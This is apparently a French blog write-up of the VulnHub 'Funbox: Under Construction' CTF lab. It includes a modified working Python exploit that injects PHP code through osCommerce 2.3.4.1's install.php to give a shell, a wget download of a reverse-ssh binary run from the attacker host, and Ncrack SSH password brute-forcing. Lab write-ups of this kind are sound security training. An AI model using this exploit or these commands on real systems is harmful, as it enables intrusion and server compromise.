---
title: Solution du CTF Funbox Under Construction de VulnHub
tags: [CTF, VulnHub]
---

### Takeover

[Funbox: Under Construction!](https://vulnhub.com/entry/funbox-under-construction,715/) est l'avant dernier de la saga des CTFs Funbox.

Pendant que Nmap tournait, j'ai lancé `feroxbuster` sur la VM :

```console
$ feroxbuster -u http://192.168.56.131/ -w DirBuster-0.12/directory-list-2.3-big.txt -n -t 20 -x php

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.131/
 🚀  Threads               │ 20
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 💲  Extensions            │ [php]
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      317c http://192.168.56.131/images
301        9l       28w      318c http://192.168.56.131/catalog
301        9l       28w      314c http://192.168.56.131/css
301        9l       28w      313c http://192.168.56.131/js
403        9l       28w      279c http://192.168.56.131/server-status
[####################] - 6m   2547124/2547124 0s      found:5       errors:41     
[####################] - 6m   2547124/2547124 7035/s  http://192.168.56.131/
```

Je me suis rendu sur `/catalog` et je suis tombé sur la page d'installation de `osCommerce`.

![oscommerce install](/assets/img/vulnhub/funbox_oscommerce.png)

On est dans un scénario similaire au [CTF Christophe de VulnHub]({% link _posts/2022-12-17-Solution-du-CTF-Christophe-de-VulnHub.md %}). Il nous faut mettre en place un serveur MySQL et procéder à l'installation de l'application web pour qu'elle utilise la base de données sous notre contrôle.

Une fois fait, on pourra certainement disposer du compte admin sur l'appli et faire... je ne sais pas quoi encore, mais on trouvera :-) 

Je mets d'abord en place le serveur MySQL :

```console
$ docker run --rm -p 3306:3306 --name some-mysql -e MYSQL_ROOT_PASSWORD=my-secret-pw -d mysql:5.7
Unable to find image 'mysql:5.7' locally
5.7: Pulling from library/mysql
20e4dcae4c69: Pull complete 
1c56c3d4ce74: Pull complete 
e9f03a1c24ce: Pull complete 
68c3898c2015: Pull complete 
6b95a940e7b6: Pull complete 
90986bb8de6e: Pull complete 
ae71319cb779: Pull complete 
ffc89e9dfd88: Pull complete 
43d05e938198: Pull complete 
064b2d298fba: Pull complete 
df9a4d85569b: Pull complete 
Digest: sha256:4bc6bc963e6d8443453676cae56536f4b8156d78bae03c0145cbe47c2aad73bb
Status: Downloaded newer image for mysql:5.7
d81a5fd6cdaa25220a2947b9d72d7e2415439e42ce51421f25c5d4e32a986d54
$ docker ps
CONTAINER ID   IMAGE       COMMAND                  CREATED          STATUS          PORTS                                                    NAMES
d81a5fd6cdaa   mysql:5.7   "docker-entrypoint.s…"   47 seconds ago   Up 46 seconds   0.0.0.0:3306->3306/tcp, [::]:3306->3306/tcp, 33060/tcp   some-mysql
$ mysql -h 127.0.0.1 -u root -p
mysql: Deprecated program name. It will be removed in a future release, use '/usr/bin/mariadb' instead
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.44 MySQL Community Server (GPL)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]> create database oscommerce;
Query OK, 1 row affected (0,001 sec)
```

Une fois la création des tables faite, je crée un compte administrateur `devloop` / `hello`.

J'ai cherché sur `exploit-db` s'il n'y a pas des solutions pour passer de compte administrateur à exécution de commande.

J'ai d'abord vu cet exploit qui repose sur la gestion des newsletters :

[osCommerce 2.3.4.1 - Arbitrary File Upload - PHP webapps Exploit](https://www.exploit-db.com/exploits/43191)

Mais je n'avais aucun champ d'upload de mon côté...

J'ai finalement trouvé différentes sections où de l'image d'image était possible, mais à chaque fois ça échouait.

Finalement dans `Tools > Security Directory Permissions` je suis tombé sur une checklist et ça montrait clairement que les dossiers étaient en lecture seule sur le serveur...

Finalement, j'ai eu recours à cet exploit. Il repose sur de l'injection de code PHP :

[osCommerce 2.3.4.1 - Remote Code Execution - PHP webapps Exploit](https://www.exploit-db.com/exploits/44374)

L'exploit manquant un peu d'ergonomie, je l'ai modifié pour qu'il offre un shell semi-interactif :

```python
from base64 import b64encode
import requests

# enter the the target url here, as well as the url to the install.php (Do NOT remove the ?step=4)
base_url = "http://192.168.56.131/catalog/"
target_url = "http://192.168.56.131/catalog/install/install.php?step=4"

data = {
    'DIR_FS_DOCUMENT_ROOT': './'
}

sess = requests.session()

while True:
    command = input("$ ").strip()
    if command in ("quit", "exit"):
        break

    command = b64encode(command.encode("utf-8", errors="ignore")).decode()
    payload = '\');'
    payload += f'system("echo {command}|base64 -d|sh");'
    payload += '/*'

    data['DB_DATABASE'] = payload

    r = sess.post(url=target_url, data=data)

    if r.status_code == 200:
        response = sess.get(base_url + "install/includes/configure.php")
        print(response.text.strip())
    else:
        print("[-] Exploit did not execute as planned")
```

Il marche comme attendu :

```console
$ python sploit2.py 
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ pwd
/var/www/html/catalog/install/includes
$ find /var/www/html/ -writable -ls
529      4 -rwxrwxrwx   1 root     root         1175 Jul  3 16:42 /var/www/html/catalog/install/includes/configure.php
    70583      4 -rwxrwxrwx   1 root     root         1267 Jul  3 16:16 /var/www/html/catalog/includes/configure.php
    34996      4 -rwxrwxrwx   1 root     root         2063 Jul  3 16:16 /var/www/html/catalog/admin/includes/configure.php
$ wget http://192.168.56.1/reverse-sshx64 -O /tmp/reverse-sshx64

$ ls -al /tmp/reverse-sshx64
-rw-r--r-- 1 www-data www-data 3690496 Oct 19  2022 /tmp/reverse-sshx64
$ chmod 755 /tmp/reverse-sshx64

$ nohup /tmp/reverse-sshx64 &
```

### Oh! et Ah!

Depuis le reverse-ssh je trouve 4 utilisateurs :

```console
www-data@funbox10:/home$ ls
total 24K
drwxr-xr-x  6 root  root  4.0K Jun 24  2021 .
drwxr-xr-x 23 root  root  4.0K Jun 25  2021 ..
drwx------  2 chuck chuck 4.0K Jul 17  2021 chuck
drwx------  3 jack  jack  4.0K Jul 17  2021 jack
drwx------  3 joe   joe   4.0K Jul 19  2021 joe
drwx------  3 susan susan 4.0K Jul 19  2021 susan
```

Ncrack en a cassé un, :

```console
ncrack -f -U users.txt -P wordlists/Top1575-probable-v2.txt ssh://192.168.56.131

Starting Ncrack 0.8 ( http://ncrack.org )

Discovered credentials for ssh on 192.168.56.131 22/tcp:
192.168.56.131 22/tcp ssh: 'joe' 'letmein'

Ncrack done: 1 service scanned in 27.02 seconds.

Ncrack finished.
```

Mais impossible de s'y connecter en SSH ou via `su`. Bug dans la matrice, `Ncrack` a craqué, mais pas le mot de passe.

`LinPEAS` ne m'a rien retourné d'intéressant. Finalement après un long moment, j'ai eu cette exécution observée depuis `pspy` :

```
2025/07/03 17:25:01 CMD: UID=1000 PID=28251  | /bin/sh -c /usr/share/doc/examples/cron.sh
```

Le script contient du base64 qui s'avère être le mot de passe `root` :

```console
www-data@funbox10:~$ cat /usr/share/doc/examples/cron.sh
# cron.sh sample file
# 0 20 * * * /bin/goahead --parameter: LXUgcm9vdCAtcCByZnZiZ3QhIQ==
www-data@funbox10:~$ echo LXUgcm9vdCAtcCByZnZiZ3QhIQ== | base64 -d 
-u root -p rfvbgt!!www-data@funbox10:~$ su root
Password: 
root@funbox10:/tmp# cd /root/
root@funbox10:~# ls -al
total 3052
drwx------  2 root root    4096 Jul 19  2021 .
drwxr-xr-x 23 root root    4096 Jun 25  2021 ..
-rw-------  1 root root      29 Jul 19  2021 .bash_history
-rw-r--r--  1 root root    3106 Oct 22  2015 .bashrc
-rw-------  1 root root     544 Jul 17  2021 .mysql_history
-rw-r--r--  1 root root     148 Aug 17  2015 .profile
-rwxr-xr-x  1 root root 3078592 Aug 22  2019 pspy64
-rw-r--r--  1 root root    1066 Jul 17  2021 root.txt
-rw-r--r--  1 root root      74 Jul 17  2021 .selected_editor
-rw-------  1 root root    6641 Jul 19  2021 .viminfo
-rw-r--r--  1 root root     229 Jul  3 16:03 .wget-hsts
root@funbox10:~# cat root.txt 
  _____            _                                                                      
 |  ___|   _ _ __ | |__   _____  ___                                                      
 | |_ | | | | '_ \| '_ \ / _ \ \/ (_)                                                     
 |  _|| |_| | | | | |_) | (_) >  < _                                                      
 |_|   \__,_|_| |_|_.__/ \___/_/\_(_)                                                     
  _   _           _                             _                   _   _               _ 
 | | | |_ __   __| | ___ _ __    ___ ___  _ __ | |_ _ __ _   _  ___| |_(_) ___  _ __   | |
 | | | | '_ \ / _` |/ _ \ '__|  / __/ _ \| '_ \| __| '__| | | |/ __| __| |/ _ \| '_ \  | |
 | |_| | | | | (_| |  __/ |    | (_| (_) | | | | |_| |  | |_| | (__| |_| | (_) | | | | |_|
  \___/|_| |_|\__,_|\___|_|     \___\___/|_| |_|\__|_|   \__,_|\___|\__|_|\___/|_| |_| (_)
                                                                                          

You did it !!!
I look forward to see this on Twitter: @0815R2d2
```




